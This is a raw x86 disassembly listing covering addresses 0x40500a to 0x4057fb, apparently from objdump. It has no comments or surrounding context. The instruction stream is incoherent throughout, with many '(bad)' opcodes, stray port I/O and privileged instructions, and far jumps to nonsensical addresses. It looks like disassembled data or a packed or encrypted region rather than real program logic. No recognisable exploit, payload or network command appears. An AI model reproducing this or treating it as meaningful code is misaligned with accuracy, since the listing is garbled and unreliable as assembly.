  40500a:	jnp    0x405076
  40500c:	idiv   DWORD PTR [esi]
  40500e:	xor    al,0xb0
  405010:	dec    edx
  405011:	sbb    al,0x7c
  405013:	jns    0x40505f
  405015:	cmp    eax,0x191f671
  40501a:	mov    eax,ds:0x64cb8050
  40501f:	push   ebp
  405020:	pop    cx
  405022:	stos   BYTE PTR es:[edi],al
  405023:	sbb    al,0xc4
  405025:	push   0xffffffc7
  405027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405028:	popa   
  405029:	in     al,dx
  40502a:	xchg   edi,eax
  40502b:	test   al,0xe0
  40502d:	cmp    al,0x8a
  40502f:	pop    edi
  405030:	dec    edi
  405031:	jecxz  0x405097
  405033:	sub    al,BYTE PTR [ebx-0x4a]
  405036:	jo     0x405027
  405038:	jmp    0x404fef
  40503a:	dec    ebp
  40503b:	push   edx
  40503c:	push   ss
  40503d:	mov    al,BYTE PTR [ecx+0x67f1abda]
  405043:	imul   ebx,ebx,0xd4c8d0a4
  405049:	mov    esp,DWORD PTR [eax-0x77]
  40504c:	mov    ecx,DWORD PTR [esi+ecx*2-0x25]
  405050:	leave  
  405051:	(bad)  
  405052:	loopne 0x405078
  405054:	loope  0x405095
  405056:	scas   eax,DWORD PTR es:[edi]
  405057:	push   0x62
  405059:	sub    al,0xff
  40505b:	adc    esp,DWORD PTR [edx]
  40505d:	jo     0x40508e
  40505f:	fisub  WORD PTR [esi+0x42]
  405062:	jmp    0x91d3369
  405067:	cmp    ch,BYTE PTR [eax+eax*1]
  40506a:	aas    
  40506b:	cmp    ebp,esp
  40506d:	jmp    0x46f41d2c
  405072:	pop    edi
  405073:	mov    cl,bl
  405075:	out    0x9f,al
  405077:	xor    esi,DWORD PTR [esi+0x78]
  40507a:	(bad)  
  40507b:	push   edi
  40507c:	adc    bh,ah
  40507e:	jmp    0x4050e7
  405080:	sub    eax,0x644e124e
  405085:	int3   
  405086:	ins    DWORD PTR es:[edi],dx
  405087:	xor    eax,0xd772a608
  40508c:	mov    al,ds:0x3a73b2d2
  405091:	inc    ecx
  405092:	jns    0x4050c7
  405094:	ja     0x405080
  405096:	fdiv   QWORD PTR ds:0x845bfdeb
  40509c:	sub    DWORD PTR [edx+0x46],ebp
  40509f:	jno    0x405108
  4050a1:	lock dec ecx
  4050a3:	dec    eax
  4050a4:	(bad)  
  4050a5:	nop
  4050a6:	push   cs
  4050a7:	mov    ecx,0x40721dd6
  4050ac:	gs mov esp,0xe1ef59ff
  4050b2:	int3   
  4050b3:	je     0x405113
  4050b5:	inc    edx
  4050b6:	push   esp
  4050b7:	jmp    0xa45b:0x30d93d47
  4050be:	out    0xf6,eax
  4050c0:	out    0xee,eax
  4050c2:	mov    ah,0x67
  4050c4:	and    al,0x31
  4050c6:	outs   dx,DWORD PTR ds:[esi]
  4050c7:	retf   0xcd56
  4050ca:	and    edi,DWORD PTR [ecx+0x2466ecbd]
  4050d0:	pop    es
  4050d1:	int3   
  4050d2:	imul   esi,DWORD PTR [esp+ecx*1-0x7721ef35],0xe6f4f4c4
  4050dd:	ret    0x326a
  4050e0:	jle    0x405095
  4050e2:	pop    ebx
  4050e3:	xchg   ebp,eax
  4050e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050e5:	or     eax,ecx
  4050e7:	mov    ebx,0x6ffac6ec
  4050ec:	es loope 0x4050c1
  4050ef:	push   ss
  4050f0:	push   cs
  4050f1:	ret    
  4050f2:	pop    es
  4050f3:	into   
  4050f4:	das    
  4050f5:	lock cld 
  4050f7:	in     al,0x84
  4050f9:	xchg   esi,eax
  4050fa:	out    0x50,al
  4050fc:	pop    edi
  4050fd:	data16 je 0x4050f9
  405100:	js     0x40516d
  405102:	stc    
  405103:	or     BYTE PTR ds:0x183e19ba,ch
  405109:	add    dl,dh
  40510b:	mov    eax,0x8c870ce7
  405110:	shl    BYTE PTR [edx+0x5c482bd9],1
  405116:	inc    edi
  405117:	sti    
  405118:	psubb  mm6,QWORD PTR [ebx+0x1e60941c]
  40511f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405120:	mov    eax,ds:0xa549bd83
  405125:	scas   eax,DWORD PTR es:[edi]
  405126:	arpl   WORD PTR [edx+edx*1+0x7d],sp
  40512a:	and    DWORD PTR [edx+ebp*4],0x6a
  40512e:	scas   eax,DWORD PTR es:[edi]
  40512f:	push   ebp
  405130:	(bad)  
  405131:	jecxz  0x405157
  405133:	add    al,0x9c
  405135:	cmp    ebx,ebx
  405137:	sub    eax,0x5df9abec
  40513c:	or     DWORD PTR [ebx+0x5d2697b1],eax
  405142:	or     BYTE PTR [ebp+0x16],al
  405145:	cmp    eax,0x14b77527
  40514a:	in     al,0xb4
  40514c:	sub    BYTE PTR [ecx-0x1fb13f75],0x11
  405153:	ror    DWORD PTR [edi+0x24],1
  405156:	xor    dh,al
  405158:	es mov esp,eax
  40515b:	imul   ebx,DWORD PTR [esi-0x312f19eb],0x116f218e
  405165:	sar    BYTE PTR [edi],1
  405167:	out    0x14,al
  405169:	push   DWORD PTR [ebx]
  40516b:	adc    al,0x93
  40516d:	cmp    DWORD PTR [ebx],ebx
  40516f:	popf   
  405170:	and    eax,ebx
  405172:	cdq    
  405173:	sub    ch,bl
  405175:	lea    esi,[edi+0x6c4de72c]
  40517b:	and    ah,bh
  40517d:	add    al,0xae
  40517f:	and    ah,BYTE PTR [esi]
  405181:	xchg   esp,eax
  405182:	stos   BYTE PTR es:[edi],al
  405183:	popfw  
  405185:	add    dh,al
  405187:	fdivr  DWORD PTR [ebp+edx*2+0x25870f0e]
  40518e:	leave  
  40518f:	fst    st(2)
  405191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405192:	dec    eax
  405193:	sbb    eax,0xc00bb5ea
  405198:	or     BYTE PTR [esi-0x6d],bl
  40519b:	ins    DWORD PTR es:[edi],dx
  40519c:	and    DWORD PTR [edx-0x38d86e5f],ebx
  4051a2:	outs   dx,BYTE PTR ds:[esi]
  4051a3:	mov    dh,0x2
  4051a5:	iret   
  4051a6:	push   ss
  4051a7:	jmp    0xc1d0:0x6a6beade
  4051ae:	pop    esi
  4051af:	inc    edi
  4051b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b1:	sbb    eax,0xf3414790
  4051b6:	inc    esi
  4051b7:	jne    0x405213
  4051b9:	ins    BYTE PTR es:[edi],dx
  4051ba:	ret    0xa6f3
  4051bd:	push   eax
  4051be:	pop    eax
  4051bf:	push   edi
  4051c0:	xor    BYTE PTR [edi],al
  4051c2:	mov    ah,0xb7
  4051c4:	mov    esi,0xf384776f
  4051c9:	ror    BYTE PTR gs:[ebx-0x25244f43],0x58
  4051d1:	into   
  4051d2:	mov    al,0xdd
  4051d4:	test   al,0x11
  4051d6:	sbb    edi,esp
  4051d8:	ds dec eax
  4051da:	cmp    al,0x1
  4051dc:	mov    bl,dh
  4051de:	push   ebx
  4051df:	pop    edx
  4051e0:	cmp    al,0xf6
  4051e2:	les    edx,FWORD PTR [edx+0x1169fe0e]
  4051e8:	test   eax,0x509d47c4
  4051ed:	shl    edi,cl
  4051ef:	pop    es
  4051f0:	inc    ebp
  4051f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051f2:	xchg   ecx,eax
  4051f3:	push   ebx
  4051f4:	mov    ebp,0x2fa9695e
  4051f9:	lock cld 
  4051fb:	jmp    DWORD PTR [edx+0x21940c3c]
  405201:	sbb    ah,dh
  405203:	dec    edi
  405204:	pusha  
  405205:	call   0x742d63dc
  40520a:	or     al,0x28
  40520c:	pop    ebp
  40520d:	dec    esp
  40520e:	pop    ss
  40520f:	test   eax,0x35af6cec
  405214:	test   BYTE PTR [ebp+ebx*4-0x18],bh
  405218:	xchg   DWORD PTR [eax],edi
  40521a:	add    bh,ch
  40521c:	or     al,0xe4
  40521e:	jo     0x4051c2
  405220:	sub    DWORD PTR [edx+0x4d],ebp
  405223:	neg    al
  405225:	popa   
  405226:	xchg   edx,eax
  405227:	inc    ecx
  405228:	mov    esp,0x3e1e943f
  40522d:	dec    eax
  40522e:	xchg   esi,eax
  40522f:	mov    cl,0x7e
  405231:	adc    BYTE PTR ds:[edx+0x6f],al
  405235:	loope  0x4051bd
  405237:	adc    bh,BYTE PTR [edx]
  405239:	out    0x10,al
  40523b:	enter  0x5e08,0x88
  40523f:	loope  0x40524d
  405241:	in     eax,dx
  405242:	jmp    0x9f85c3f3
  405247:	dec    eax
  405248:	and    DWORD PTR [ecx-0x66],ebx
  40524b:	in     eax,dx
  40524c:	loop   0x405227
  40524e:	mov    es,WORD PTR [ebp+0x75f48674]
  405254:	in     al,0xa
  405256:	ror    BYTE PTR [ecx],1
  405258:	fwait
  405259:	jmp    0x6129:0x6fe40973
  405260:	pop    ebx
  405261:	ins    BYTE PTR es:[edi],dx
  405262:	(bad)  
  405263:	std    
  405264:	call   0xd1ff:0x8873ff3d
  40526b:	add    dl,bh
  40526d:	xchg   ebp,eax
  40526e:	aad    0x4d
  405270:	test   eax,ebp
  405272:	adc    al,cl
  405274:	in     eax,0xd3
  405276:	cli    
  405277:	in     eax,dx
  405278:	mov    cl,0x1
  40527a:	shr    DWORD PTR [edi+eiz*2],1
  40527d:	mov    al,ds:0xe62f7f22
  405282:	ds inc ebp
  405284:	push   ecx
  405285:	test   eax,0x70a40228
  40528a:	xor    dl,dl
  40528c:	ins    BYTE PTR es:[edi],dx
  40528d:	or     ch,BYTE PTR [edx]
  40528f:	sahf   
  405290:	loope  0x405215
  405292:	push   esi
  405293:	gs push edi
  405295:	lahf   
  405296:	pop    ss
  405297:	loope  0x4052bc
  405299:	jae    0x405288
  40529b:	ret    0xdf13
  40529e:	xor    BYTE PTR [eax],bh
  4052a0:	(bad)  
  4052a1:	push   esi
  4052a2:	dec    esp
  4052a3:	paddsw mm7,QWORD PTR [eax]
  4052a6:	inc    ebp
  4052a7:	or     DWORD PTR [eax],eax
  4052a9:	mov    esp,0x5a88e30d
  4052ae:	arpl   bx,sp
  4052b0:	mov    ds:0x52559f4,al
  4052b5:	mov    eax,0xaff914a3
  4052ba:	pop    ecx
  4052bb:	mov    ah,0xdc
  4052bd:	pop    ss
  4052be:	fisttp DWORD PTR [eax]
  4052c0:	pop    esi
  4052c1:	xchg   ebx,eax
  4052c2:	mov    cl,0x8e
  4052c4:	(bad)  
  4052c5:	popf   
  4052c6:	or     DWORD PTR [edi+0x75ff3e6a],ebx
  4052cc:	jae    0x405321
  4052ce:	xchg   BYTE PTR fs:[edx+0x49],ah
  4052d2:	cmp    al,0x67
  4052d4:	xchg   BYTE PTR [ecx+0x65b350f6],ch
  4052da:	stos   BYTE PTR es:[edi],al
  4052db:	pusha  
  4052dc:	les    edi,FWORD PTR [eax+0x14]
  4052df:	xor    DWORD PTR [eax+eax*8+0x54c4ae1d],ebx
  4052e6:	and    al,0xb0
  4052e8:	push   edi
  4052e9:	mov    dh,0x8c
  4052eb:	sar    DWORD PTR [ebx-0x67],cl
  4052ee:	fmul   DWORD PTR [ebx]
  4052f0:	arpl   di,sp
  4052f2:	pop    edi
  4052f3:	test   al,0x38
  4052f5:	inc    ebx
  4052f6:	lods   eax,DWORD PTR es:[esi]
  4052f8:	stos   DWORD PTR es:[edi],eax
  4052f9:	(bad)  
  4052fa:	iret   
  4052fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052fc:	(bad)  
  4052fd:	mov    ds:0x74ac23b5,eax
  405302:	in     al,0x3d
  405304:	cmp    cl,BYTE PTR [ecx+0xba86645]
  40530a:	lods   al,BYTE PTR ds:[esi]
  40530b:	neg    bl
  40530d:	sub    esp,DWORD PTR [ebx+ebx*4-0x46]
  405311:	mov    bl,0xff
  405313:	xlat   BYTE PTR ds:[ebx]
  405314:	shl    DWORD PTR [eax],cl
  405316:	inc    edx
  405317:	adc    al,0xe8
  405319:	(bad)  
  40531a:	xor    al,0x3f
  40531c:	aam    0x5d
  40531e:	add    edi,esi
  405320:	test   BYTE PTR [ecx+0x28ee936],dl
  405326:	push   ecx
  405327:	or     eax,0xcdb4b05a
  40532c:	xchg   esi,eax
  40532d:	nop    ebx
  405330:	pop    eax
  405331:	mov    esp,0xb3ccf02e
  405336:	push   edx
  405337:	lods   al,BYTE PTR ds:[esi]
  405338:	or     dh,BYTE PTR [eax-0x3e]
  40533b:	sbb    esp,DWORD PTR [eax+0x1904e25b]
  405341:	push   0xffffff9b
  405343:	lods   eax,DWORD PTR ds:[esi]
  405344:	mov    ds:0x6c5a79b2,al
  405349:	push   esp
  40534a:	lock push ebx
  40534c:	and    ah,BYTE PTR [eax-0x3]
  40534f:	inc    esp
  405350:	mov    bl,0xb5
  405352:	dec    esp
  405353:	outs   dx,BYTE PTR ds:[esi]
  405354:	mov    esi,0xd9a86d11
  405359:	mov    edi,0x8374adbb
  40535e:	popa   
  40535f:	push   ecx
  405360:	pusha  
  405361:	icebp  
  405362:	in     al,dx
  405363:	push   es
  405364:	xor    al,0xb6
  405366:	xchg   ebx,eax
  405367:	cmp    bh,al
  405369:	push   ebp
  40536a:	add    esp,DWORD PTR [edx-0x7425be59]
  405370:	mov    eax,0x4887125f
  405375:	adc    edx,esi
  405377:	or     eax,0xc807801a
  40537c:	inc    ebx
  40537d:	sbb    DWORD PTR [ecx+esi*8],ecx
  405380:	xchg   edx,eax
  405381:	sbb    BYTE PTR [edx-0x49],ch
  405384:	mov    al,bh
  405386:	push   ebx
  405387:	(bad)  
  405388:	xlat   BYTE PTR ds:[ebx]
  405389:	sbb    al,0x9f
  40538b:	cwde   
  40538c:	pop    esp
  40538d:	sub    ebp,DWORD PTR [edi+esi*4-0x319111f0]
  405394:	cmp    BYTE PTR [esi+0x4397954c],0x3e
  40539b:	loop   0x4053b6
  40539d:	hlt    
  40539e:	(bad)  
  40539f:	mov    ecx,0xe90b8de
  4053a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053a5:	and    bl,0x62
  4053a8:	and    al,0xa6
  4053aa:	inc    esi
  4053ab:	push   esi
  4053ac:	dec    edx
  4053ad:	jno    0x405354
  4053af:	xor    ebp,ecx
  4053b1:	shr    DWORD PTR [edi],0x34
  4053b4:	xchg   esp,eax
  4053b5:	stos   BYTE PTR es:[edi],al
  4053b6:	jecxz  0x4053b3
  4053b8:	or     DWORD PTR [ecx],edi
  4053ba:	ret    0x98d0
  4053bd:	(bad)  
  4053be:	cmp    BYTE PTR [ebx-0x5f],dl
  4053c1:	ret    
  4053c2:	pop    ebx
  4053c3:	cmp    BYTE PTR [ebx-0x4c],dh
  4053c6:	shr    BYTE PTR [ebp+0x52],0xb2
  4053ca:	cdq    
  4053cb:	adc    eax,0x438ba5fa
  4053d0:	mov    ecx,0xe49d0631
  4053d5:	xchg   ecx,eax
  4053d6:	pop    esp
  4053d7:	daa    
  4053d8:	xor    bl,BYTE PTR [eax]
  4053da:	pop    esp
  4053db:	jne    0x405367
  4053dd:	or     ecx,DWORD PTR [esi+0x7a]
  4053e0:	lock (bad) 
  4053e2:	add    eax,0xc789a106
  4053e7:	ja     0x40540f
  4053e9:	sub    eax,0x488bb1eb
  4053ee:	retf   0x54a
  4053f1:	adc    BYTE PTR [esi+0x40b51d51],0x2f
  4053f8:	(bad)  
  4053f9:	jmp    0x1d2dca3f
  4053fe:	jne    0x40543e
  405400:	fsub   QWORD PTR [esi-0x65cedcf2]
  405406:	adc    eax,0x4a479eb4
  40540b:	int3   
  40540c:	sub    eax,0x511c7bd0
  405411:	pop    esi
  405412:	pop    esp
  405413:	mov    eax,0x8e7a9b63
  405418:	adc    BYTE PTR [ebp-0x40],dh
  40541b:	sar    dl,cl
  40541d:	lods   eax,DWORD PTR ds:[esi]
  40541e:	mov    ah,BYTE PTR [ecx-0x6a1c962e]
  405424:	mov    ds:0x394cf2ae,al
  405429:	jge    0x4053f7
  40542b:	pop    ebx
  40542c:	pop    edi
  40542d:	imul   edx,ebx,0xffffff91
  405430:	stos   DWORD PTR es:[edi],eax
  405431:	jecxz  0x405414
  405433:	push   edx
  405434:	pushf  
  405435:	inc    edi
  405436:	or     edi,DWORD PTR [esp+eax*1-0x60]
  40543a:	ror    BYTE PTR [ebx+ecx*1-0x2df68871],cl
  405441:	ja     0x40545b
  405443:	push   0xa0d455a6
  405448:	retf   0xf35
  40544b:	dec    ecx
  40544c:	cmp    ecx,edx
  40544e:	mov    ebx,0xa20ee008
  405453:	dec    ebp
  405454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405455:	les    esp,FWORD PTR [ecx+ebx*2]
  405458:	push   ebp
  405459:	jno    0x4054ae
  40545b:	jnp    0x405449
  40545d:	(bad)  
  40545e:	aad    0x92
  405460:	mov    BYTE PTR [esp+ebp*4+0x7b],bl
  405464:	cmp    al,0x94
  405466:	sar    DWORD PTR [esi],1
  405468:	shl    DWORD PTR [ebx+0x1ee2a224],cl
  40546e:	inc    esp
  40546f:	bound  esi,QWORD PTR [esp+edi*8+0x69cbc334]
  405476:	in     eax,0x93
  405478:	data16 add al,0x3
  40547b:	pop    ds
  40547c:	dec    ebp
  40547d:	fcompp 
  40547f:	mov    eax,ds:0x9536309c
  405484:	push   es
  405485:	mov    bl,0xf4
  405487:	add    eax,0x72577fff
  40548c:	fisttp WORD PTR [ecx]
  40548e:	inc    ecx
  40548f:	jl     0x40546f
  405491:	mov    eax,ds:0x91016d66
  405496:	cmp    DWORD PTR [ecx],0xf0ff542f
  40549c:	push   ds
  40549d:	inc    eax
  40549e:	adc    BYTE PTR [ebp+0x45efacbd],0x1
  4054a5:	cs add eax,0xb7cc83bb
  4054ab:	mov    al,0xe6
  4054ad:	test   al,0xfb
  4054af:	xchg   edi,eax
  4054b0:	or     dh,BYTE PTR [ebp+0x26]
  4054b3:	or     ebp,0x9aaf47c5
  4054b9:	adc    cl,BYTE PTR [esp+eiz*4-0x20]
  4054bd:	adc    eax,0xec944971
  4054c2:	mov    al,ds:0x4bff6bfd
  4054c7:	dec    DWORD PTR [edx]
  4054c9:	in     al,dx
  4054ca:	pop    eax
  4054cb:	pop    edi
  4054cc:	test   eax,0x8a06d256
  4054d1:	mov    edi,0x70988db9
  4054d6:	inc    eax
  4054d7:	adc    bh,BYTE PTR [esi-0x35]
  4054da:	rcl    DWORD PTR [ebx],cl
  4054dc:	pusha  
  4054dd:	xchg   BYTE PTR [ebp-0x1650da4e],bh
  4054e3:	ror    edx,0x47
  4054e6:	jbe    0x4054e4
  4054e8:	cdq    
  4054e9:	or     WORD PTR [ebx+0x57a209d],dx
  4054f0:	inc    eax
  4054f1:	cmp    BYTE PTR [esi+esi*2],dh
  4054f4:	lods   eax,DWORD PTR ds:[esi]
  4054f5:	jp     0x92938907
  4054fb:	and    al,0xeb
  4054fd:	fldenv [ebx+0x1]
  405500:	out    0x1,al
  405502:	in     al,0x18
  405504:	or     DWORD PTR [ebx+edi*1-0x55],ebp
  405508:	retf   
  405509:	mov    ds:0xc78a6faa,eax
  40550e:	lahf   
  40550f:	and    BYTE PTR [edx+0x14b1a436],ch
  405515:	rcr    DWORD PTR [edx],0xa2
  405518:	test   eax,0x604f8f8b
  40551d:	in     al,0x7a
  40551f:	enter  0xb556,0x59
  405523:	xchg   esp,eax
  405524:	pop    edi
  405525:	and    DWORD PTR [edx+0x20894fbc],ebx
  40552b:	dec    ebp
  40552c:	mov    bh,0x68
  40552e:	xor    dh,BYTE PTR [ebx+0x63]
  405531:	test   al,0x4
  405533:	outs   dx,DWORD PTR ds:[esi]
  405534:	adc    BYTE PTR [edx+eiz*2-0x5c],0x91
  405539:	jne    0x405588
  40553b:	scas   al,BYTE PTR es:[edi]
  40553c:	call   0x6f0d:0x4c00be42
  405543:	(bad)  
  405544:	jl     0x40555a
  405546:	ret    0x5b2e
  405549:	shl    BYTE PTR ds:0x1003f3d0,1
  40554f:	jmp    0x67deb551
  405554:	popa   
  405555:	adc    BYTE PTR [ebp-0x72],ah
  405558:	cmp    eax,0xb563add1
  40555d:	or     al,0x16
  40555f:	dec    ebp
  405560:	(bad)  
  405561:	clc    
  405562:	pop    ebp
  405563:	lods   al,BYTE PTR ds:[esi]
  405564:	pop    ecx
  405565:	mov    ebx,0x49187dd0
  40556a:	ds js  0x405556
  40556d:	push   esp
  40556e:	push   ds
  40556f:	xor    al,BYTE PTR [ebx+0x62]
  405572:	out    dx,al
  405573:	jb     0x4055b3
  405575:	mov    BYTE PTR [ebp+0x18d719c5],dl
  40557b:	xchg   BYTE PTR [edi],cl
  40557d:	mov    dl,0xdc
  40557f:	sub    esp,ebp
  405581:	pop    edx
  405582:	add    bl,ah
  405584:	aam    0x78
  405586:	mov    esp,0x655594b1
  40558b:	xchg   ebp,eax
  40558c:	jb     0x405532
  40558e:	mov    ebp,0x71de6a37
  405593:	dec    esp
  405594:	sub    ecx,eax
  405596:	jmp    0xd10d:0x803334e0
  40559d:	mov    al,ds:0xe90e5ca8
  4055a2:	sbb    ebp,DWORD PTR [ebx+0x5e2255da]
  4055a8:	neg    BYTE PTR [eax-0x7d5f27eb]
  4055ae:	push   eax
  4055af:	pop    esi
  4055b0:	jne    0x40554f
  4055b2:	mov    ds:0x7fd1c1ff,al
  4055b7:	mov    al,ds:0xfddca4bd
  4055bc:	imul   esi,DWORD PTR [esi+0x43],0x4e644426
  4055c3:	push   esp
  4055c4:	push   esi
  4055c5:	jnp    0x4055bb
  4055c7:	imul   esp,DWORD PTR [eax+0x2225d1c2],0xffffffaf
  4055ce:	push   ebx
  4055cf:	dec    ecx
  4055d0:	stos   DWORD PTR es:[edi],eax
  4055d1:	dec    DWORD PTR ds:0x994936df
  4055d7:	out    0x3e,eax
  4055d9:	sahf   
  4055da:	stc    
  4055db:	jmp    0x8e163f88
  4055e0:	inc    ebp
  4055e1:	jmp    esp
  4055e3:	inc    edi
  4055e4:	jbe    0x40560e
  4055e6:	lods   eax,DWORD PTR ds:[esi]
  4055e7:	dec    edx
  4055e8:	cmp    dh,dh
  4055ea:	rol    DWORD PTR [ebx+0x2f1beb17],0xed
  4055f1:	push   edi
  4055f2:	pop    edx
  4055f3:	adc    edi,edi
  4055f5:	ret    
  4055f6:	jmp    0xc9d8e6df
  4055fb:	loope  0x40561d
  4055fd:	cmc    
  4055fe:	sub    eax,0xaac9cac7
  405603:	(bad)  
  405604:	mov    es,WORD PTR [ecx+0x6eca64f7]
  40560a:	(bad)  
  40560c:	ja     0x4055ab
  40560e:	add    bl,cl
  405610:	inc    ebp
  405611:	fcmovnb st,st(0)
  405613:	ss mov al,0x7f
  405616:	mov    eax,ds:0xa63c18d6
  40561b:	adc    eax,0x1c80e03
  405620:	inc    eax
  405621:	mov    dh,0xe0
  405623:	je     0x40568e
  405625:	mov    dh,0xf8
  405627:	scas   eax,DWORD PTR es:[edi]
  405628:	xor    DWORD PTR [ebx],ebx
  40562a:	mov    dl,0xc1
  40562c:	xchg   ebx,eax
  40562d:	cwde   
  40562e:	pushf  
  40562f:	mov    ds:0x92c991c,al
  405634:	and    eax,0x4668c271
  405639:	mov    ebp,0xc77a2e6f
  40563e:	ficomp WORD PTR ds:[ecx+0x3d407d7e]
  405645:	push   ds
  405646:	outs   dx,BYTE PTR ds:[esi]
  405647:	sbb    al,BYTE PTR [eax+0x3812ac5b]
  40564d:	jl     0x40569b
  40564f:	(bad)  
  405650:	mov    dl,0xc0
  405652:	repnz inc ecx
  405654:	add    BYTE PTR [ecx+0x7c],ch
  405657:	pop    esi
  405658:	or     ch,BYTE PTR ds:0x527f917b
  40565e:	add    DWORD PTR [edx-0x58],eax
  405661:	sub    esi,DWORD PTR [eax+0x46]
  405664:	sbb    DWORD PTR [ecx+0x1bedb52d],esp
  40566a:	jo     0x4056e6
  40566c:	fld    TBYTE PTR [edx-0xd]
  40566f:	sub    dh,BYTE PTR [eax]
  405671:	jae    0x405608
  405673:	fs gs dec edx
  405676:	(bad)  
  405677:	int    0x1
  405679:	sub    al,0xd8
  40567b:	jecxz  0x4056f6
  40567d:	rcl    DWORD PTR [edi+0xa00cbf4],1
  405683:	imul   edi,DWORD PTR [edi-0x5aaed6af],0x7f
  40568a:	lods   eax,DWORD PTR ds:[esi]
  40568b:	je     0x4056fc
  40568d:	out    0x75,eax
  40568f:	xchg   ebx,eax
  405690:	xchg   ebx,eax
  405691:	mov    esi,0xf55b83f6
  405696:	mov    edx,0x1ffb85fd
  40569b:	jae    0x405711
  40569d:	arpl   WORD PTR [esi+ebx*4],cx
  4056a0:	mov    bh,0xf9
  4056a2:	xor    DWORD PTR [ebx+0x7816b0f9],eax
  4056a8:	mov    ebp,0x17b2502d
  4056ad:	mov    al,ds:0xf3ec2096
  4056b2:	(bad)  
  4056b3:	aam    0xc6
  4056b5:	jne    0x40571e
  4056b7:	outs   dx,DWORD PTR cs:[esi]
  4056b9:	jne    0x40567d
  4056bb:	sbb    DWORD PTR [eax+0x27a336a],esi
  4056c1:	bound  ebp,QWORD PTR [ebp+ebp*8-0x46a1024e]
  4056c8:	push   edi
  4056c9:	jge    0x405697
  4056cb:	int    0x7c
  4056cd:	xchg   ebx,eax
  4056ce:	xchg   ebx,eax
  4056cf:	mov    dl,0xe2
  4056d1:	xor    al,0xfd
  4056d3:	xchg   ebp,eax
  4056d4:	dec    ecx
  4056d5:	pop    ebp
  4056d6:	mov    BYTE PTR fs:[ecx],ah
  4056d9:	mov    edx,0xa496034a
  4056de:	jnp    0x405712
  4056e0:	push   esi
  4056e1:	push   eax
  4056e2:	mov    ah,0x79
  4056e4:	dec    ecx
  4056e5:	push   ebp
  4056e6:	adc    eax,0x3ce5e7fd
  4056eb:	mov    ebx,0x14f2c20d
  4056f0:	jp     0x4056c7
  4056f2:	into   
  4056f3:	cdq    
  4056f4:	sbb    al,0xc3
  4056f6:	jp     0x4056ef
  4056f8:	int    0x47
  4056fa:	pop    ebp
  4056fb:	in     eax,dx
  4056fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056fd:	add    DWORD PTR [ebx+0x6f],esp
  405700:	mov    bl,0x71
  405702:	retf   
  405703:	adc    al,0x9b
  405705:	push   0x5fb9f33e
  40570a:	and    BYTE PTR [ebx+0xdb64dd5],ah
  405710:	push   ds
  405711:	jo     0x405696
  405713:	pop    ss
  405714:	add    eax,0x68c4c836
  405719:	add    edx,eax
  40571b:	das    
  40571c:	adc    edx,edx
  40571e:	(bad)
  405721:	push   eax
  405722:	push   ds
  405723:	jecxz  0x4056e5
  405725:	jmp    0x405782
  405727:	sub    DWORD PTR [ebp+0x36],0x797b1a00
  40572e:	ret    
  40572f:	xchg   esp,eax
  405730:	data16 sahf 
  405732:	inc    ecx
  405733:	hlt    
  405734:	jle    0x4056ec
  405736:	jnp    0x4057b2
  405738:	xchg   ebx,eax
  405739:	pop    esp
  40573a:	inc    ecx
  40573b:	sub    eax,0x5d85b5af
  405740:	fstp   DWORD PTR [edx+0x7c8afd4d]
  405746:	dec    esp
  405747:	scas   eax,DWORD PTR es:[edi]
  405748:	retf   0xb1e1
  40574b:	sub    al,0x8e
  40574d:	cmp    ecx,DWORD PTR ds:0x9ea2976
  405753:	push   0xffffffac
  405755:	mov    ds,WORD PTR [eax+0x5f]
  405758:	sar    BYTE PTR [edx+0x1d],0xbf
  40575c:	add    eax,0xffffff91
  40575f:	jae    0x4057a1
  405761:	dec    ebp
  405762:	fs pop edx
  405764:	add    DWORD PTR [edx],ecx
  405766:	stc    
  405767:	clc    
  405768:	repz mov cl,0x97
  40576b:	mov    bl,0x90
  40576d:	jbe    0x4057cd
  40576f:	data16 cmp dl,BYTE PTR [ebx]
  405772:	stc    
  405773:	inc    eax
  405774:	jle    0x4057bd
  405776:	nop
  405777:	cmp    al,0xb4
  405779:	(bad)  
  40577a:	cli    
  40577b:	xchg   ecx,eax
  40577c:	sub    ch,BYTE PTR [eax]
  40577e:	loopne 0x4057db
  405780:	pop    ebp
  405781:	(bad)  
  405782:	scas   eax,DWORD PTR es:[edi]
  405783:	jmp    0x7385:0x7e167c1f
  40578a:	out    0x65,eax
  40578c:	push   0x72aa73f7
  405791:	push   esp
  405792:	(bad)  
  405793:	into   
  405794:	adc    al,0xc7
  405796:	xor    edi,esp
  405798:	loop   0x40575d
  40579a:	xor    BYTE PTR [esi+0x5eb828bd],bh
  4057a0:	mov    ebp,DWORD PTR [ebx-0x39]
  4057a3:	or     BYTE PTR [ebx*8-0x1f8d4ede],0x17
  4057ab:	inc    edi
  4057ac:	(bad)  
  4057ad:	out    0x14,eax
  4057af:	push   cs
  4057b0:	push   eax
  4057b1:	push   edx
  4057b2:	mov    WORD PTR [edx+0x23],ds
  4057b5:	mov    edi,0xb6ed8098
  4057ba:	push   ebx
  4057bb:	push   edx
  4057bc:	dec    ecx
  4057bd:	loope  0x405756
  4057bf:	pop    ebx
  4057c0:	dec    edi
  4057c1:	mov    eax,0xe719d4de
  4057c6:	mov    ah,0xd3
  4057c8:	xlat   BYTE PTR ds:[ebx]
  4057c9:	adc    al,0xe3
  4057cb:	xchg   ebx,eax
  4057cc:	xchg   BYTE PTR [eax*1-0x548ee60c],dh
  4057d3:	jnp    0x4057c6
  4057d5:	and    DWORD PTR [edx+0x40d0a2b6],ebx
  4057db:	mul    BYTE PTR [edx+0x1d311f16]
  4057e1:	inc    ebx
  4057e2:	mov    edx,DWORD PTR [edi+ebp*8-0x57]
  4057e6:	mov    ecx,0x420db9b6
  4057eb:	test   DWORD PTR [eax+esi*1],esi
  4057ee:	ds ins DWORD PTR es:[edi],dx
  4057f0:	mov    bh,0xb3
  4057f2:	add    BYTE PTR [ebx-0x58c83822],al
  4057f8:	(bad)  
  4057f9:	cmp    esp,DWORD PTR [ebx]
  4057fb:	mov    al,0xa1
